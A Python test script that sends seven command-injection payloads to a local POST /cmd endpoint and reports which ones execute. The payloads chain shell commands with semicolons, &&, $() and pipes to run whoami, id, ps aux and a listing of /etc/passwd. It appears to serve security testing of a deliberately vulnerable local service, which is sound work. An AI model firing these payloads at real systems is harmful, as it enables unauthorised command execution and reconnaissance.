#!/usr/bin/env python3
"""
Command Injection Test Script
Tests 7 payloads against POST /cmd endpoint
Target: Direct command execution via user input
"""

import requests
import json
import sys
import time

BASE_URL = "http://localhost:5000"
WAIT = 10

PAYLOADS = [
    {
        "id": 1,
        "command": "echo test; whoami",
        "description": "Semicolon injection - chain commands",
        "expected_output": "ubuntuhero",
    },
    {
        "id": 2,
        "command": "echo test && id",
        "description": "AND operator injection - conditional execution",
        "expected_output": "uid=",
    },
    {
        "id": 3,
        "command": "echo $(cat /etc/hostname)",
        "description": "Command substitution - inject via dollar-paren",
        "expected_output": None,
        "expected_length": 1,
    },
    {
        "id": 4,
        "command": "echo test | head -1",
        "description": "Pipe injection - redirect output",
        "expected_output": "test",
    },
    {
        "id": 5,
        "command": "echo $(date)",
        "description": "Command substitution - display current date",
        "expected_output": None,
        "check_type": "has_output",
    },
    {
        "id": 6,
        "command": "ps aux | head -5",
        "description": "Pipe chaining - show top 5 processes",
        "expected_output": "PID",
    },
    {
        "id": 7,
        "command": "ls -la /etc/ | grep passwd",
        "description": "Grep filter - find passwd entry in /etc",
        "expected_output": "passwd",
    },
]

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def test_payload(payload):
    """Test a single command injection payload"""
    try:
        response = requests.post(
            f"{BASE_URL}/cmd",
            json={"command": payload["command"]},
            timeout=15,
        )

        data = response.json()

        passed = False
        result_detail = ""

        if data.get("status") == "success":
            output = data.get("output", "")

            check_type = payload.get("check_type", "expected_output")

            if check_type == "has_output":
                if output and len(output.strip()) > 0:
                    passed = True
                    result_detail = f"Output: {output.strip()[:80]}..."
                else:
                    result_detail = "Empty output"
            elif payload.get("expected_output"):
                if payload["expected_output"] in output:
                    passed = True
                    result_detail = f"Found '{payload['expected_output']}' in output"
                    result_detail += f"\n    Output: {output.strip()[:120]}..."
                else:
                    result_detail = f"'{payload['expected_output']}' not found in output"
            elif payload.get("expected_length"):
                if len(output.strip()) >= payload["expected_length"]:
                    passed = True
                    result_detail = f"Output length: {len(output.strip())} bytes"
            else:
                if output:
                    passed = True
                    result_detail = f"Output: {output.strip()[:80]}..."
        else:
            result_detail = f"Server error: {data.get('message', 'Unknown')}"

        return {
            "id": payload["id"],
            "description": payload["description"],
            "command": payload["command"],
            "status_code": response.status_code,
            "passed": passed,
            "detail": result_detail,
        }

    except requests.exceptions.Timeout:
        return {
            "id": payload["id"],
            "description": payload["description"],
            "command": payload["command"],
            "status_code": 0,
            "passed": False,
            "detail": "Request timed out (15s)",
        }
    except requests.exceptions.RequestException as e:
        return {
            "id": payload["id"],
            "description": payload["description"],
            "command": payload["command"],
            "status_code": 0,
            "passed": False,
            "detail": str(e),
        }


def print_report(results):
    """Print test results summary"""
    print("\n" + "=" * 70)
    print(f"{BOLD}Command Injection Test Results - POST /cmd{RESET}")
    print("=" * 70)

    passed_count = 0

    for r in results:
        status = f"{GREEN}PASS{RESET}" if r["passed"] else f"{RED}FAIL{RESET}"
        if r["passed"]:
            passed_count += 1

        print(f"\n  {BOLD}[{status}]{RESET} Payload #{r['id']}: {r['description']}")
        print(f"    Command: {r['command']}")
        print(f"    Response: HTTP {r['status_code']}")
        print(f"    {r['detail']}")

    print("\n" + "-" * 70)
    print(f"{BOLD}Summary: {passed_count}/{len(results)} payloads passed{RESET}")
    if passed_count == len(results):
        print(f"{GREEN}All commands executed successfully. Arbitrary command injection confirmed.{RESET}")
    elif passed_count > 0:
        print(f"{YELLOW}Some commands executed. Endpoint is vulnerable to command injection.{RESET}")
    else:
        print(f"{RED}No commands executed successfully.{RESET}")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    print(f"{BOLD}[*] Starting Command Injection tests against {BASE_URL}/cmd{RESET}")
    print(f"[*] Testing {len(PAYLOADS)} payloads...\n")

    results = []
    for p in PAYLOADS:
        r = test_payload(p)
        results.append(r)
        if p["id"] != len(PAYLOADS):
            time.sleep(WAIT)
    print_report(results)

    sys.exit(0 if any(r["passed"] for r in results) else 1)
